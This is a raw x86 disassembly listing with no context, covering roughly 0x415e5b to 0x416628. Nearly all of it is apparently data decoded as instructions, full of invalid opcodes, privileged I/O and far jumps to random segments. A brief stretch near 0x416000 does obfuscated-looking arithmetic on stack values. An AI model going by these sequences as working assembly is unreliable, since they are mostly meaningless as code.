  415e5b:	loopne 0x415dea
  415e5d:	push   ss
  415e5e:	mov    bh,0xf
  415e60:	mov    bh,0x70
  415e62:	addr16 or al,0x53
  415e65:	lds    edi,FWORD PTR [esi]
  415e67:	mov    ch,0x6d
  415e69:	aaa    
  415e6a:	into   
  415e6b:	repnz (bad) 
  415e6d:	js     0x415e49
  415e6f:	test   eax,0x3aa2edfe
  415e74:	es xor al,0xe6
  415e77:	fucomp st(1)
  415e79:	repz pushf 
  415e7b:	mov    ecx,0x7c4e762e
  415e80:	jae    0x415e78
  415e82:	lahf   
  415e83:	xor    ebx,DWORD PTR [ebx]
  415e85:	mov    ds,WORD PTR [edi-0x80]
  415e88:	mov    dh,BYTE PTR cs:[edi+ecx*2]
  415e8c:	hlt    
  415e8d:	ret    
  415e8e:	sub    ah,dh
  415e90:	push   ecx
  415e91:	fcmovb st,st(2)
  415e93:	out    dx,al
  415e94:	sar    BYTE PTR [eax],1
  415e96:	push   esp
  415e97:	pop    edx
  415e98:	jno    0x415e2f
  415e9a:	(bad)  
  415e9b:	mov    edi,0x502f6d19
  415ea0:	std    
  415ea1:	jno    0x415ef5
  415ea3:	into   
  415ea4:	sbb    bl,dh
  415ea6:	jmp    0xbb26f316
  415eab:	sahf   
  415eac:	add    BYTE PTR [ebx-0x711e2ba5],cl
  415eb2:	fwait
  415eb3:	jne    0x415f0e
  415eb5:	inc    ebx
  415eb6:	push   es
  415eb7:	jns    0x415f38
  415eb9:	js     0x415ea9
  415ebb:	jge    0x415ef8
  415ebd:	out    0xd0,eax
  415ebf:	xor    ebx,0xffffffb4
  415ec2:	jmp    0x415e78
  415ec4:	outs   dx,DWORD PTR ds:[esi]
  415ec5:	pushf  
  415ec6:	sub    al,0xc7
  415ec8:	lods   al,BYTE PTR cs:[esi]
  415eca:	retf   
  415ecb:	xchg   esi,eax
  415ecc:	adc    al,0x45
  415ece:	loopne 0x415ed8
  415ed0:	(bad)  
  415ed1:	fbstp  TBYTE PTR [edi-0x3b]
  415ed4:	das    
  415ed5:	cmp    al,0xf1
  415ed7:	xchg   edx,eax
  415ed8:	fcom   DWORD PTR [edx+0x3]
  415edb:	xchg   BYTE PTR [ecx],bl
  415edd:	mov    ebx,0xf0f681a4
  415ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee3:	daa    
  415ee4:	xlat   BYTE PTR ds:[ebx]
  415ee5:	cld    
  415ee6:	jmp    0x415e8b
  415ee8:	inc    ebp
  415ee9:	mov    ss,WORD PTR [esi]
  415eeb:	fimul  WORD PTR [eax-0x8]
  415eee:	dec    edi
  415eef:	jmp    0xb0aa1489
  415ef4:	repnz mov dh,0x59
  415ef7:	sbb    esi,DWORD PTR [edx+0xe]
  415efa:	xchg   edx,eax
  415efb:	fs xchg ecx,ebx
  415efe:	bound  ebp,QWORD PTR [ebx+0x13acea8b]
  415f04:	push   edx
  415f05:	adc    edx,edi
  415f07:	shl    BYTE PTR [edi+0x36a0bb2],1
  415f0d:	jnp    0x415ebd
  415f0f:	repnz cmp bl,BYTE PTR [ecx+0x1ca90439]
  415f16:	xor    esi,DWORD PTR [ebx+0x2eb8ea46]
  415f1c:	es stos DWORD PTR es:[edi],eax
  415f1e:	adc    eax,0x9077dbd7
  415f23:	cdq    
  415f24:	retf   0xb2a1
  415f27:	cwde   
  415f28:	sub    dl,BYTE PTR [ebx+ecx*2]
  415f2b:	jbe    0x415edf
  415f2d:	xor    al,0x55
  415f2f:	jb     0x415f89
  415f31:	aad    0x39
  415f33:	jne    0x415f88
  415f35:	aaa    
  415f36:	icebp  
  415f37:	cmp    edx,DWORD PTR [ecx+0x71b14dec]
  415f3d:	outs   dx,BYTE PTR ds:[esi]
  415f3e:	std    
  415f3f:	or     BYTE PTR gs:[edx+0x66],dl
  415f43:	and    BYTE PTR [esi-0xd],0x96
  415f47:	addr16 cmc 
  415f49:	pop    esp
  415f4a:	or     ah,dl
  415f4c:	dec    ebx
  415f4d:	sbb    cl,BYTE PTR [esi]
  415f4f:	jnp    0x415f26
  415f51:	int    0x4a
  415f53:	jae    0x415fae
  415f55:	mov    esi,0xcc89f664
  415f5a:	das    
  415f5b:	ret    
  415f5c:	pop    es
  415f5d:	add    al,0x25
  415f5f:	test   al,0xf3
  415f61:	test   BYTE PTR [edx],bh
  415f63:	mov    cl,BYTE PTR [ecx-0x39226d98]
  415f69:	fidiv  WORD PTR [ebx-0x6ba51247]
  415f6f:	add    DWORD PTR ss:[eax],0xe363f1e
  415f76:	sub    al,BYTE PTR [ecx]
  415f78:	psadbw mm7,QWORD PTR [esi]
  415f7b:	dec    edx
  415f7c:	imul   eax,DWORD PTR [eax],0xffffffe7
  415f7f:	fsubr  QWORD PTR [eax]
  415f81:	sbb    edi,DWORD PTR [eax+ebx*4+0x2268508b]
  415f88:	clc    
  415f89:	clc    
  415f8a:	jbe    0x415f13
  415f8c:	push   ebp
  415f8d:	out    0x6f,al
  415f8f:	outs   dx,BYTE PTR ds:[esi]
  415f90:	cmp    eax,0xfdbd2660
  415f95:	cli    
  415f96:	scas   eax,DWORD PTR es:[edi]
  415f97:	push   ecx
  415f98:	test   BYTE PTR [esi],dh
  415f9a:	fwait
  415f9b:	data16 xor al,0x72
  415f9e:	rcl    esi,cl
  415fa0:	mov    eax,ds:0x5f98d624
  415fa5:	jb     0x415f88
  415fa7:	das    
  415fa8:	nop
  415fa9:	adc    al,0x86
  415fab:	push   edi
  415fac:	and    DWORD PTR [ebx-0x47500a5c],0x7f
  415fb3:	test   eax,0xc28f2cec
  415fb8:	sbb    al,0x65
  415fba:	(bad)  
  415fbb:	dec    esi
  415fbc:	push   0xba21719c
  415fc1:	add    DWORD PTR [esi-0x6cedbb6c],ebx
  415fc7:	mov    dh,0x96
  415fc9:	test   DWORD PTR [edi-0x3f],ebp
  415fcc:	jmp    0x6373:0xdc3a99d0
  415fd3:	jmp    0xc0da:0xf0143d25
  415fda:	push   edi
  415fdb:	inc    edx
  415fdc:	loop   0x415f87
  415fde:	mov    al,ds:0x6662d3f1
  415fe3:	sub    cl,BYTE PTR [edi]
  415fe5:	jmp    0x425:0x9656f733
  415fec:	(bad)  [ecx+0x69]
  415fef:	imul   esp,eax,0xffffffef
  415ff2:	push   ebx
  415ff3:	mov    ebp,0xfeda25c4
  415ff8:	std    
  415ff9:	add    al,0xbc
  415ffb:	stos   BYTE PTR es:[edi],al
  415ffc:	test   al,cl
  415ffe:	pop    esp
  415fff:	pushf  
  416000:	mov    edx,0xb4b48643
  416005:	xor    edx,ebx
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xcd5645d5
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	ret    
  41605c:	jg     0x416083
  41605e:	dec    esi
  41605f:	xor    BYTE PTR [esi+0x3bf0fb5f],cl
  416065:	mov    cl,BYTE PTR [ecx]
  416067:	in     eax,0xa
  416069:	mov    ds:0xcc5e230d,al
  41606e:	dec    ebp
  41606f:	cld    
  416070:	retf   0xaadf
  416073:	xor    edi,ecx
  416075:	cmc    
  416076:	fdiv   DWORD PTR [esi]
  416078:	jno    0x4160ba
  41607a:	adc    al,0xe7
  41607c:	sti    
  41607d:	in     al,dx
  41607e:	enter  0xc5d9,0x31
  416082:	aad    0x4c
  416084:	loop   0x41600b
  416086:	inc    ebp
  416087:	test   DWORD PTR [edi+eax*1-0x59],0xac6c8d6a
  41608f:	aas    
  416090:	int    0x57
  416092:	xor    al,0x66
  416094:	mov    eax,0xd8c91806
  416099:	mov    DWORD PTR [ebp-0x10],esi
  41609c:	ret    
  41609d:	jnp    0x416114
  41609f:	adc    bh,ch
  4160a1:	mov    al,ds:0xa0c882a
  4160a6:	add    DWORD PTR [eax-0x28dc32a7],ebp
  4160ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160ad:	add    ebx,ebx
  4160af:	(bad)  
  4160b0:	jns    0x416038
  4160b2:	jo     0x416050
  4160b4:	xor    DWORD PTR [ebp+ecx*8-0xc],esi
  4160b8:	lods   al,BYTE PTR ds:[esi]
  4160b9:	daa    
  4160ba:	and    eax,0x8efad3b9
  4160bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160c1:	pop    esp
  4160c2:	jg     0x416063
  4160c4:	nop    DWORD PTR [ebp+0x6ead6c55]
  4160cb:	stos   BYTE PTR es:[edi],al
  4160cc:	mov    ebx,edi
  4160ce:	fiadd  DWORD PTR [ecx-0x1f371b86]
  4160d4:	sbb    eax,0xbebc9384
  4160d9:	or     esi,DWORD PTR [edi]
  4160db:	iret   
  4160dc:	adc    dh,BYTE PTR [edi]
  4160de:	aam    0x3d
  4160e0:	outs   dx,BYTE PTR ds:[esi]
  4160e1:	pop    ss
  4160e2:	jmp    0x357c:0x26e2b026
  4160e9:	mov    eax,ds:0x351bfcac
  4160ee:	cdq    
  4160ef:	mov    ch,0x9c
  4160f1:	push   eax
  4160f2:	add    edx,esi
  4160f4:	and    al,0x3f
  4160f6:	cmp    al,0x74
  4160f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160f9:	jg     0x41608d
  4160fb:	inc    ecx
  4160fc:	sub    bl,ch
  4160fe:	sar    DWORD PTR [ebx],0x4
  416101:	mov    esp,0x842e4ac4
  416106:	xlat   BYTE PTR ds:[ebx]
  416107:	push   esp
  416108:	fs out dx,eax
  41610a:	or     BYTE PTR [edi],dl
  41610c:	sti    
  41610d:	and    BYTE PTR [edi-0x1bed6bce],cl
  416113:	cmc    
  416114:	outs   dx,BYTE PTR ds:[si]
  416116:	pusha  
  416117:	mov    edi,0xbc0a1264
  41611c:	pop    eax
  41611d:	mov    edx,0x915a4c21
  416122:	adc    eax,0x6496ba9b
  416127:	jmp    0xf54a:0xf31f5e9b
  41612e:	mov    bh,0x41
  416130:	jo     0x416117
  416132:	fcom   st(4)
  416134:	xchg   esp,eax
  416135:	retf   0xfd79
  416138:	retf   
  416139:	fbld   TBYTE PTR [esi-0x30]
  41613c:	pop    ds
  41613d:	pop    edx
  41613e:	retf   0xef64
  416141:	mov    eax,ds:0xaabc0de0
  416146:	cmp    edx,edx
  416148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416149:	fcomp  QWORD PTR [eax+0x16bd93a3]
  41614f:	lds    esp,FWORD PTR ds:0x27baec2a
  416155:	rcl    DWORD PTR [esi+0x76f5ae2c],cl
  41615b:	or     eax,0xe959c47d
  416160:	or     ebp,DWORD PTR [ebp-0x3e]
  416163:	popa   
  416164:	je     0x416137
  416166:	adc    DWORD PTR [ebx+0x5a],0x3b
  41616a:	lods   eax,DWORD PTR ds:[esi]
  41616b:	popf   
  41616c:	daa    
  41616d:	cmp    eax,0xc4dbfba3
  416172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416173:	inc    ecx
  416174:	rol    bh,1
  416176:	adc    al,0x84
  416178:	loop   0x4161f0
  41617a:	rol    DWORD PTR [ecx],0x6b
  41617d:	loope  0x41615d
  41617f:	jae    0x416177
  416181:	adc    BYTE PTR fs:[edx+ecx*8],bl
  416185:	mov    eax,0xc6c41e25
  41618a:	fld    DWORD PTR [ecx]
  41618c:	cli    
  41618d:	stos   BYTE PTR es:[edi],al
  41618e:	mov    ecx,0xcb407314
  416193:	add    DWORD PTR [eax+0x7da122c3],edi
  416199:	jge    0x416181
  41619b:	lods   al,BYTE PTR ds:[esi]
  41619c:	xlat   BYTE PTR ds:[ebx]
  41619d:	je     0x4161a9
  41619f:	sub    dl,BYTE PTR ds:[eax+0x204682bc]
  4161a6:	mov    ebx,eax
  4161a8:	leave  
  4161a9:	nop
  4161aa:	and    esp,ebp
  4161ac:	(bad)  
  4161ae:	stos   DWORD PTR es:[edi],eax
  4161af:	pop    ds
  4161b0:	ins    DWORD PTR es:[edi],dx
  4161b1:	cmp    BYTE PTR [edx-0x10],ch
  4161b4:	test   eax,0x9605351b
  4161b9:	pop    esp
  4161ba:	mov    BYTE PTR [ebx+ecx*1-0x6a],al
  4161be:	xchg   ebx,eax
  4161bf:	jle    0x416145
  4161c1:	rol    BYTE PTR [ecx+0x14],cl
  4161c4:	in     al,0x13
  4161c6:	or     ebp,DWORD PTR [eax-0x6e]
  4161c9:	test   DWORD PTR [ebp-0x1978ce30],edi
  4161cf:	dec    eax
  4161d0:	sub    BYTE PTR [esp+eax*2-0x3f5e408b],al
  4161d7:	pop    esp
  4161d8:	mov    ds:0xb5747932,al
  4161dd:	out    0xd2,al
  4161df:	and    esp,DWORD PTR [eax+0x5]
  4161e2:	cmp    bl,BYTE PTR [ebx+0x62]
  4161e5:	fwait
  4161e6:	gs mov ecx,0x148c9d5f
  4161ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161ed:	dec    eax
  4161ee:	jmp    0x8e1aad3b
  4161f3:	stc    
  4161f4:	cdq    
  4161f5:	scas   eax,DWORD PTR es:[edi]
  4161f6:	sub    al,0x19
  4161f8:	es stos BYTE PTR es:[edi],al
  4161fa:	push   ebp
  4161fb:	jmp    0x801e:0x36241a4c
  416202:	add    al,0xbd
  416204:	pop    ebx
  416205:	sti    
  416206:	mov    ecx,0xfa4521d6
  41620b:	xor    ebp,edi
  41620d:	test   al,0xb3
  41620f:	repz inc edx
  416211:	mov    bl,0x85
  416213:	div    bh
  416215:	inc    esp
  416216:	mov    edx,0xc742fa0
  41621b:	xor    DWORD PTR [edi+0x4ca1c3b4],eax
  416221:	in     eax,0x96
  416223:	pop    edi
  416224:	cld    
  416225:	test   al,0x7f
  416227:	jmp    0xccbd:0x8f32748c
  41622e:	pop    ds
  41622f:	mov    cl,0x9c
  416231:	pop    ss
  416232:	(bad)  
  416233:	clc    
  416234:	ja     0x4161db
  416236:	fwait
  416237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416238:	stc    
  416239:	std    
  41623a:	sbb    dl,BYTE PTR [ecx+esi*2]
  41623d:	cmp    dh,BYTE PTR [eax]
  41623f:	and    bh,dl
  416241:	sbb    ebx,ebx
  416243:	pop    ss
  416244:	fcom   QWORD PTR [edx]
  416246:	stc    
  416247:	ret    
  416248:	xchg   ebp,eax
  416249:	fwait
  41624a:	adc    ah,bh
  41624c:	pop    edi
  41624d:	xor    eax,0xd6d67933
  416252:	mov    al,BYTE PTR [edx]
  416254:	sub    DWORD PTR [esi-0x2678b3b3],eax
  41625a:	inc    ebx
  41625b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625c:	push   ecx
  41625d:	mov    bh,0x2f
  41625f:	imul   eax,DWORD PTR [ebx-0x1b48f655],0x74f10307
  416269:	add    esi,esi
  41626b:	push   edx
  41626c:	push   0xffffff91
  41626e:	fs loope 0x416272
  416271:	mov    al,cl
  416273:	adc    al,0x56
  416275:	out    0x45,al
  416277:	in     al,dx
  416278:	mov    cl,0x31
  41627a:	lea    esi,cs:[esp+edi*1+0x500edde9]
  416282:	mov    esp,0x41f97c77
  416287:	push   edx
  416288:	call   FWORD PTR [edi-0x346346c]
  41628e:	fwait
  41628f:	ins    DWORD PTR es:[edi],dx
  416290:	out    dx,al
  416291:	sbb    bl,BYTE PTR [edx+0x27]
  416294:	sub    BYTE PTR [eax+eax*4],bl
  416297:	mov    edx,0x673a9ea3
  41629c:	pop    ds
  41629d:	cmp    BYTE PTR [esi-0x5c],0x9
  4162a1:	test   BYTE PTR [esi-0x19],ah
  4162a4:	not    DWORD PTR [edi-0x1982a355]
  4162aa:	popa   
  4162ab:	jge    0x416242
  4162ad:	and    al,0x6f
  4162af:	jbe    0x4162f7
  4162b1:	mov    dh,0x2
  4162b3:	shl    BYTE PTR [edi],cl
  4162b5:	nop
  4162b6:	ret    
  4162b7:	inc    edi
  4162b8:	mov    dh,0x77
  4162ba:	out    0x32,eax
  4162bc:	cmp    eax,0x30d39142
  4162c1:	adc    al,0x60
  4162c3:	(bad)  
  4162c5:	push   esi
  4162c6:	add    dl,bh
  4162c8:	dec    edx
  4162c9:	out    0xf7,al
  4162cb:	jl     0x4162d4
  4162cd:	fidiv  WORD PTR [edx-0x43dadbcc]
  4162d3:	fsubr  st(3),st
  4162d5:	mov    cl,dl
  4162d7:	or     al,0x3a
  4162d9:	cmp    al,0x0
  4162db:	push   ecx
  4162dc:	add    eax,0x5198768c
  4162e1:	sbb    BYTE PTR [edi+edx*8],cl
  4162e4:	jle    0x41635d
  4162e6:	leave  
  4162e7:	fcmovne st,st(6)
  4162e9:	push   ebx
  4162ea:	(bad)  
  4162eb:	in     eax,dx
  4162ec:	pop    ss
  4162ed:	jmp    0xe3e7:0xaca9aee4
  4162f4:	fild   DWORD PTR [ebx-0x1]
  4162f7:	mov    edi,0x53666511
  4162fc:	repz mov eax,0x1b2d6844
  416302:	(bad)  
  416304:	in     al,0xc5
  416306:	mov    ch,0x74
  416308:	push   0x638295f4
  41630d:	retf   0x756e
  416310:	dec    ebp
  416311:	dec    edi
  416312:	mov    eax,ds:0x443d838c
  416317:	shr    BYTE PTR [ebp-0x2d],1
  41631a:	(bad)  
  41631b:	mov    edi,0x1239a267
  416320:	or     eax,0x6124b2af
  416325:	xlat   BYTE PTR ds:[ebx]
  416326:	push   ds
  416327:	push   esi
  416328:	push   esp
  416329:	mov    edi,0xebf919d5
  41632e:	mov    ds,WORD PTR [edi-0x3e]
  416331:	scas   eax,DWORD PTR es:[edi]
  416332:	syscall 
  416334:	and    al,0x1e
  416336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416337:	dec    ebx
  416338:	xchg   esi,eax
  416339:	mov    bl,0xbe
  41633b:	fcomi  st,st(1)
  41633d:	or     cl,BYTE PTR [esi+ebx*1-0x47a514d0]
  416344:	shr    dh,1
  416346:	pop    esi
  416347:	call   0xce7bdd3f
  41634c:	test   al,0xde
  41634e:	out    0xb8,al
  416350:	outs   dx,DWORD PTR ds:[esi]
  416351:	(bad)  
  416353:	pop    edi
  416354:	mov    WORD PTR [ebp-0x147324d4],ds
  41635a:	(bad)  
  41635b:	int3   
  41635c:	adc    DWORD PTR [ebp+0x35],edi
  41635f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416360:	les    ecx,FWORD PTR [esi+eiz*2+0x72227459]
  416367:	es and eax,0xe641ab5b
  41636d:	ret    0x25b9
  416370:	jmp    0x438f3974
  416375:	adc    ah,BYTE PTR [ebx-0x77]
  416378:	or     DWORD PTR [ebx-0x4678bdec],ebx
  41637e:	adc    BYTE PTR [eax+0x39],dh
  416381:	shl    BYTE PTR [ebx],1
  416383:	or     DWORD PTR [esi-0x18],ecx
  416386:	dec    esi
  416387:	xlat   BYTE PTR ds:[ebx]
  416388:	into   
  416389:	mov    dl,0xb8
  41638b:	adc    ch,al
  41638d:	stc    
  41638e:	push   ecx
  41638f:	rol    esi,1
  416391:	push   edi
  416392:	arpl   cx,cx
  416394:	xchg   cl,cl
  416396:	xor    edi,edx
  416398:	jb     0x41634c
  41639a:	sub    BYTE PTR [edi-0x2d],ch
  41639d:	pushf  
  41639e:	sbb    cl,BYTE PTR ds:0x8e18a8c3
  4163a4:	jg     0x4163ae
  4163a6:	es loop 0x4163fd
  4163a9:	fs sbb eax,edi
  4163ac:	mul    al
  4163ae:	pop    esi
  4163af:	mov    ah,0xf1
  4163b1:	push   ecx
  4163b2:	(bad)  
  4163b4:	adc    edi,DWORD PTR [edi]
  4163b6:	mov    eax,0xf51f44d9
  4163bb:	inc    edi
  4163bc:	imul   edx
  4163be:	push   cs
  4163bf:	jne    0x4163c9
  4163c1:	xor    DWORD PTR [ebp-0x11],ebp
  4163c4:	cdq    
  4163c5:	sub    dh,BYTE PTR [edi]
  4163c7:	aad    0x52
  4163c9:	or     al,0x9e
  4163cb:	jmp    0x416425
  4163cd:	push   ecx
  4163ce:	sbb    BYTE PTR [eax+0x5bd06a3b],ah
  4163d4:	add    ebp,DWORD PTR [ecx]
  4163d6:	cmp    al,0x24
  4163d8:	add    DWORD PTR [edi+0x1f],ebp
  4163db:	adc    al,0x20
  4163dd:	cmc    
  4163de:	sar    cx,0x13
  4163e2:	add    edx,edx
  4163e4:	inc    edx
  4163e5:	mov    dl,0x84
  4163e7:	ins    BYTE PTR es:[edi],dx
  4163e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e9:	retf   0x4c81
  4163ec:	cdq    
  4163ed:	sub    ch,BYTE PTR [edx]
  4163ef:	out    0xeb,eax
  4163f1:	pushf  
  4163f2:	mov    bh,0xa0
  4163f4:	sbb    al,0x71
  4163f6:	jg     0x4163de
  4163f8:	mov    al,0xcc
  4163fa:	push   esp
  4163fb:	cmp    BYTE PTR [eax+0x28e691b5],bl
  416401:	xor    al,0xb7
  416403:	cmp    eax,0xe5929e72
  416408:	push   0xffffffe4
  41640a:	or     BYTE PTR [eax+0x2f],al
  41640d:	es aaa 
  41640f:	add    dh,ah
  416411:	jnp    0x416484
  416413:	push   ecx
  416414:	dec    eax
  416415:	fucomp st(7)
  416417:	retf   0xb631
  41641a:	icebp  
  41641b:	or     al,0x8
  41641d:	fs pop ecx
  41641f:	cmp    bl,BYTE PTR [eax+0x242c9e0b]
  416425:	addr16 pop ebp
  416427:	mul    DWORD PTR [ebx]
  416429:	adc    DWORD PTR [eax+0x2b6b5920],edi
  41642f:	retf   0xdee4
  416432:	add    al,0x56
  416434:	test   BYTE PTR [ecx+0x11ce484c],ah
  41643a:	call   DWORD PTR [ecx+0x213b41f5]
  416440:	stc    
  416441:	xor    DWORD PTR [esi-0x9e5987c],0xaaa4a061
  41644b:	cs pop ds
  41644d:	xchg   edi,eax
  41644e:	imul   ebp,ecx,0x56
  416451:	xor    bl,ch
  416453:	ret    
  416454:	sbb    bl,BYTE PTR [ebx-0x5]
  416457:	dec    ebx
  416458:	mov    eax,0xbeddc584
  41645d:	repnz mov ?,eax
  416460:	outs   dx,DWORD PTR ds:[esi]
  416461:	je     0x416444
  416463:	sbb    DWORD PTR [eax-0x2b],eax
  416466:	int3   
  416467:	fst    QWORD PTR [edi+eiz*2+0x30]
  41646b:	cmc    
  41646c:	sbb    ah,BYTE PTR [edx*2-0x4cfe3d54]
  416473:	(bad)  
  416474:	sbb    BYTE PTR [esi+0x2cc3f9bb],al
  41647a:	cmc    
  41647b:	std    
  41647c:	mov    al,ds:0xd3809fc2
  416481:	xor    esp,edx
  416483:	adc    DWORD PTR [eax],edi
  416485:	push   eax
  416486:	sbb    edx,DWORD PTR [edi]
  416488:	call   0x8911b518
  41648d:	cdq    
  41648e:	sbb    eax,0x27890308
  416493:	scas   al,BYTE PTR es:[edi]
  416494:	in     al,0x74
  416496:	mov    ch,0xba
  416498:	xor    ch,ch
  41649a:	jne    0x4164b8
  41649c:	icebp  
  41649d:	(bad)  
  41649e:	enter  0xf9fd,0x37
  4164a2:	dec    ebp
  4164a3:	test   eax,0xb35da474
  4164a8:	inc    bx
  4164aa:	leave  
  4164ab:	adc    BYTE PTR [esi-0x34a7cbf8],dh
  4164b1:	shl    BYTE PTR [edi+ebp*2+0x67],0xf0
  4164b6:	sahf   
  4164b7:	push   0xffffffd7
  4164b9:	sbb    eax,0x607d15a6
  4164be:	(bad)  
  4164bf:	mov    edi,0xdcb11219
  4164c4:	(bad)  
  4164c5:	xor    eax,0xc605c3
  4164ca:	dec    edi
  4164cb:	shl    BYTE PTR ds:0x6c7bc607,0xa1
  4164d2:	xlat   BYTE PTR ds:[ebx]
  4164d3:	sub    DWORD PTR [ebx+0x19977284],eax
  4164d9:	cmp    eax,0x75bd4680
  4164de:	push   cs
  4164df:	cmp    edx,DWORD PTR [ebp+0x70e9c77d]
  4164e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e6:	popf   
  4164e7:	out    0xca,al
  4164e9:	pop    ebx
  4164ea:	lods   eax,DWORD PTR ds:[esi]
  4164eb:	es fcomp st(7)
  4164ee:	jae    0x41656f
  4164f0:	outs   dx,DWORD PTR ds:[esi]
  4164f1:	jle    0x416491
  4164f3:	lods   al,BYTE PTR ds:[esi]
  4164f4:	sti    
  4164f5:	in     al,dx
  4164f6:	adc    BYTE PTR [esi-0xabbe6b6],bl
  4164fc:	ins    DWORD PTR es:[edi],dx
  4164fd:	out    0x1e,al
  4164ff:	popa   
  416500:	adc    al,0xf
  416502:	jae    0x41655b
  416504:	jo     0x4164b0
  416506:	xchg   esi,eax
  416507:	sbb    eax,0x842f35f0
  41650c:	cdq    
  41650d:	aaa    
  41650e:	jmp    0xafdd3585
  416513:	jle    0x416563
  416515:	pop    eax
  416516:	repz mov al,0xaa
  416519:	(bad)  
  41651a:	dec    ebp
  41651b:	out    0x12,eax
  41651d:	test   BYTE PTR [edi],bl
  41651f:	lods   eax,DWORD PTR ds:[esi]
  416520:	dec    edi
  416521:	inc    ebp
  416522:	ss jl  0x416518
  416525:	loope  0x4164ee
  416527:	fnsetpm(287 only) 
  416529:	sub    eax,0xeb95c273
  41652e:	inc    ebp
  41652f:	loopne 0x416527
  416531:	inc    esi
  416532:	fdivr  QWORD PTR [esi+eiz*2-0x13]
  416536:	nop
  416537:	addr16 pop ecx
  416539:	popf   
  41653a:	sbb    BYTE PTR [eax-0x2c],dh
  41653d:	jmp    DWORD PTR [eax]
  41653f:	jecxz  0x41654f
  416541:	xor    ah,BYTE PTR [eax+0x3b337b12]
  416547:	pop    edi
  416548:	and    DWORD PTR [ecx-0x27],esi
  41654b:	sub    al,0xf0
  41654d:	call   0xacc7:0xd3324db
  416554:	sbb    BYTE PTR [esi+edx*1],0x24
  416558:	stos   BYTE PTR es:[edi],al
  416559:	sbb    BYTE PTR [ebx-0x630213c9],dh
  41655f:	and    eax,0xdb5d7821
  416564:	repz dec esi
  416566:	or     BYTE PTR [ebp-0x3b],0xc6
  41656a:	ret    
  41656b:	sub    eax,ebx
  41656d:	or     al,0xea
  41656f:	fcomi  st,st(0)
  416571:	add    DWORD PTR [edi-0x330d4cad],esp
  416577:	dec    edx
  416578:	dec    esp
  416579:	xor    al,0x27
  41657b:	ret    0xfb2b
  41657e:	dec    esi
  41657f:	sub    BYTE PTR [ebx-0xf556d3],bh
  416585:	jns    0x416591
  416587:	xchg   esi,ebx
  416589:	addr16 pop ebp
  41658b:	mov    edx,0x50d62098
  416590:	mov    dh,0x11
  416592:	or     al,0xb9
  416594:	loop   0x4165a6
  416596:	cmp    DWORD PTR [edi-0x2c],eax
  416599:	sub    cl,dl
  41659b:	xchg   DWORD PTR [edx+0x14],esp
  41659e:	add    ecx,esp
  4165a0:	mov    eax,ds:0xa6e0072d
  4165a5:	aas    
  4165a6:	mov    al,0x3d
  4165a8:	mov    ebp,DWORD PTR ds:0x4003639a
  4165ae:	push   esp
  4165af:	xor    bh,al
  4165b1:	mov    eax,0x946cab6a
  4165b6:	push   ds
  4165b7:	adc    esp,DWORD PTR [ecx+eax*1+0x6f]
  4165bb:	call   0x89c7:0x543ebe
  4165c2:	(bad)  
  4165c3:	push   eax
  4165c4:	test   BYTE PTR [ebx],ah
  4165c6:	inc    edi
  4165c7:	repz popa 
  4165c9:	push   esp
  4165ca:	stc    
  4165cb:	nop
  4165cc:	ins    BYTE PTR es:[edi],dx
  4165cd:	fnstcw WORD PTR [ebp-0x4b]
  4165d0:	dec    esi
  4165d1:	clc    
  4165d2:	or     al,BYTE PTR [eax+0x20d7f7e]
  4165d8:	and    DWORD PTR [esi-0x7a],edx
  4165db:	(bad)  
  4165dc:	out    dx,al
  4165dd:	push   0xffffffa8
  4165df:	test   al,0x89
  4165e1:	jmp    0x5c96:0x8118f9ee
  4165e8:	into   
  4165e9:	dec    edx
  4165ea:	xlat   BYTE PTR ds:[ebx]
  4165eb:	test   BYTE PTR [edi],bl
  4165ed:	xlat   BYTE PTR ds:[ebx]
  4165ee:	ss (bad) 
  4165f0:	pushf  
  4165f1:	rcl    BYTE PTR [ebx+0x27aa8451],cl
  4165f7:	jno    0x4165a9
  4165f9:	jmp    0xa5d223b
  4165fe:	sbb    BYTE PTR [edi-0x3d],0xe
  416602:	xor    edi,DWORD PTR [esi]
  416604:	lahf   
  416605:	fiadd  DWORD PTR [esi-0x6]
  416608:	inc    ecx
  416609:	cmp    edi,DWORD PTR [edi+esi*1]
  41660c:	lods   eax,DWORD PTR ds:[esi]
  41660d:	in     al,0xf0
  41660f:	aaa    
  416610:	stos   DWORD PTR es:[edi],eax
  416611:	or     al,0xbb
  416613:	add    dl,BYTE PTR [ebx-0x16]
  416616:	gs cld 
  416618:	xor    eax,0x6451443e
  41661d:	mov    edx,0xa72ac32
  416622:	div    BYTE PTR [ebp-0x19]
  416625:	gs sbb eax,0xe66c6174
